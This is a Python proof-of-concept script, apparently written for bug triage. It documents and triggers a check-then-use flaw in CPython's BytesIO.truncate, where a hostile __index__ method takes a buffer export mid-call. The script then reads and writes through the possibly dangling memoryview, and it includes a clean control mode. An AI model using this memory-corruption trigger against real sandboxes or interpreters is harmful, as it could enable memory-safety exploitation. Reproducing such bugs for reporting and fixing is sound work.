"""bytesio.c: _io.BytesIO.truncate runs __index__ AFTER CHECK_EXPORTS.

Modules/_io/bytesio.c:736 _io_BytesIO_truncate_impl
    CHECK_CLOSED(self);
    CHECK_EXPORTS(self);            <-- exports read here (== 0)
    ...
    new_size = PyLong_AsLong(size); <-- PyLong_AsLong -> _PyNumber_Index -> user __index__
    ...
    if (new_size < self->string_size) {
        self->string_size = new_size;
        resize_buffer_lock_held(self, new_size);   <-- asserts exports == 0, then _PyBytes_Resize
    }

A user __index__ that calls bio.getbuffer() raises exports to 1 between the check
and the resize, so the buffer is reallocated while a live memoryview points into it.

Guarded twin: write_bytes_lock_held (bytesio.c:241-248) runs its Python-reaching
PyObject_GetBuffer FIRST and only then calls check_closed()/check_exports().

Usage: <python> bytesio_truncate_index_export.py [mode]
  mode=probe   (default) trigger + touch the stale view
  mode=noindex control: plain int truncate, must be clean
"""
import sys

MODE = sys.argv[1] if len(sys.argv) > 1 else "probe"

import io

BIG = 200_000  # large enough that _PyBytes_Resize actually moves/shrinks the block

holder = {}


class Evil:
    def __index__(self):
        # runs INSIDE truncate(), after CHECK_EXPORTS already read exports == 0
        holder["view"] = holder["bio"].getbuffer()   # exports 0 -> 1
        return 0


def main():
    bio = io.BytesIO(b"A" * BIG)
    holder["bio"] = bio

    if MODE == "noindex":
        m = bio.getbuffer()
        try:
            bio.truncate(0)
        except BufferError as e:
            print("control OK: BufferError:", e)
            m.release()
            return 0
        print("control UNEXPECTED: truncate succeeded with a live export")
        m.release()
        return 3

    try:
        r = bio.truncate(Evil())
        print("truncate returned", r)
    except BaseException as e:
        print("truncate raised", type(e).__name__, e)

    v = holder.get("view")
    print("have view:", v is not None, "len:", (len(v) if v is not None else None))
    if v is not None:
        # read through the (now possibly dangling) export
        total = 0
        b = bytes(v)
        total = sum(b[:1024])
        print("read through view ok, first-1k checksum", total)
        # write through it too -- the view is read-write
        v[0:1] = b"Z"
        print("wrote through view ok")
        try:
            v.release()
        except BaseException as e:
            print("release raised", type(e).__name__, e)
    print("getvalue len", len(bio.getvalue()))
    return 0


sys.exit(main())
